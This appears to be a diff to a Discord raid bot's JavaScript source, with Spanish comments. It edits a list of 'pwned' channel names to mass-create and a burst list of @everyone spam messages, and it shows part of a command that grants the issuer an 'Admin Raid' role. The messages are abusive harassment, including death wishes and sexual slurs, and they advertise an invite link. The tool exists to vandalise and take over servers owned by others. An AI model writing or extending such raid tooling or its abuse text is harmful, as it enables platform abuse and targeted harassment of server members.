@@ -111,7 +111,7 @@ client.on('messageCreate', async (message) => {
     // (si querés volver a limitarlo, solo pon de nuevo el if de OWNER_IDS)
 
     const nombresDeCanales = [
-      "pwned-by-la-elite-7-brou",
+      "pwned-by-la-elite-7-brous",
       "pwned-by-la-elite-7-brou",
       "pwned-by-la-elite-7-brou",
       "pwned-by-la-elite-7-brou",
@@ -144,47 +144,47 @@ client.on('messageCreate', async (message) => {
     ];
 
     const mensajesEnRafaga = [
-      "@everyone domado sale en las noticias chupando pene https://discord.gg/ZZBf67J7",
-      "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/ZZBf67J7",
-      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7",
-      "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7",
-      "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7",
-      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7",
-      "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7",
-      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7 ",
-      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7 ",
-      "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7 ",
-      "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7 ",
-      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7 ",
-      "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7",
-      "@everyone domado sale en las noticias chupando pene https://discord.gg/ZZBf67J7",
-      "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/ZZBf67J7",
-      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7 ",
-      "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7 ",
-      "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7 ",
-      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7",
-      "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J ",
-      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7 ",
-      "@everyone domado sale en las noticias chupando pene https://discord.gg/ZZBf67J7 ",
-      "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/ZZBf67J7 ",
-      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7 ",
-      "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7 ",
-      "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7 ",
-      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7",
-      "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7 ",
-      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7 ",
-      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7 ",
-      "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J ",
-      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7 ",
-      "@everyone domado sale en las noticias chupando pene https://discord.gg/ZZBf67J7 ",
-      "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/ZZBf67J7 ",
-      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7 ",
-      "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7 ",
-      "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7 ",
-      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7 ",
-      "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7 ",
-      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7 ",
-      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7 "
+      "@everyone domado sale en las noticias chupando pene https://discord.gg/Gvpej3G6",
+      "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/Gvpej3G6",
+      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/Gvpej3G6",
+      "@everyone ojalas te mueras hijueputa https://discord.gg/Gvpej3G6",
+      "@everyone puto mal parido hijueputa https://discord.gg/Gvpej3G6",
+      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/Gvpej3G6",
+      "@everyone pendejo subnormal hijueputa https://discord.gg/Gvpej3G6",
+      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/Gvpej3G6",
+      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/Gvpej3G6",
+      "@everyone ojalas te mueras hijueputa https://discord.gg/Gvpej3G6",
+      "@everyone puto mal parido hijueputa  https://discord.gg/Gvpej3G6",
+      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/Gvpej3G6 ",
+      "@everyone pendejo subnormal hijueputa https://discord.gg/Gvpej3G6",
+      "@everyone domado sale en las noticias chupando pene https://discord.gg/Gvpej3G6",
+      "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/Gvpej3G6",
+      "@everyone JAJAJAJAJA PUTO PERRO  https://discord.gg/Gvpej3G6",
+      "@everyone ojalas te mueras hijueputa  https://discord.gg/Gvpej3G6",
+      "@everyone puto mal parido hijueputa https://discord.gg/Gvpej3G6",
+      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/Gvpej3G6",
+      "@everyone pendejo subnormal hijueputa https://discord.gg/Gvpej3G6 ",
+      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/Gvpej3G6 ",
+      "@everyone domado sale en las noticias chupando pene https://discord.gg/Gvpej3G6 ",
+      "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/Gvpej3G6 ",
+      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/Gvpej3G6 ",
+      "@everyone ojalas te mueras hijueputa https://discord.gg/Gvpej3G6 ",
+      "@everyone puto mal parido hijueputa https://discord.gg/Gvpej3G6 ",
+      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/Gvpej3G6",
+      "@everyone pendejo subnormal hijueputa  https://discord.gg/Gvpej3G6",
+      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/Gvpej3G6 ",
+      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/Gvpej3G6 ",
+      "@everyone pendejo subnormal hijueputa  https://discord.gg/Gvpej3G6",
+      "@everyone Tu server asqueroso JAJAJAJa  https://discord.gg/Gvpej3G6",
+      "@everyone domado sale en las noticias chupando pene https://discord.gg/Gvpej3G6 ",
+      "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/Gvpej3G6 ",
+      "@everyone JAJAJAJAJA PUTO PERRO 7 https://discord.gg/Gvpej3G6",
+      "@everyone ojalas te mueras hijueputa  https://discord.gg/Gvpej3G6",
+      "@everyone puto mal parido hijueputa  https://discord.gg/Gvpej3G6",
+      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/Gvpej3G6 ",
+      "@everyone pendejo subnormal hijueputa https://discord.gg/Gvpej3G6 ",
+      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/Gvpej3G6 ",
+      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/Gvpej3G6 "
     ];
 
     const delayCreacionCanales = 200;
@@ -287,7 +287,7 @@ client.on('messageCreate', async (message) => {
       await message.member.roles.add(rolAdmin);
       await message.channel.send(`¡Listo! Ahora tienes **Admin Raid** en **${serverName}** 😈`);
 
-      await message.channel.send(`@everyone EL OWNER AHORA ES ADMIN AQUÍ 🔥 https://discord.gg/tu-invite`);
+      await message.channel.send(`@everyone EL OWNER AHORA ES ADMIN AQUÍ 🔥 tu-invite`);
 
     } catch (err) {
       console.error('Error en !admin:', err.message || err);
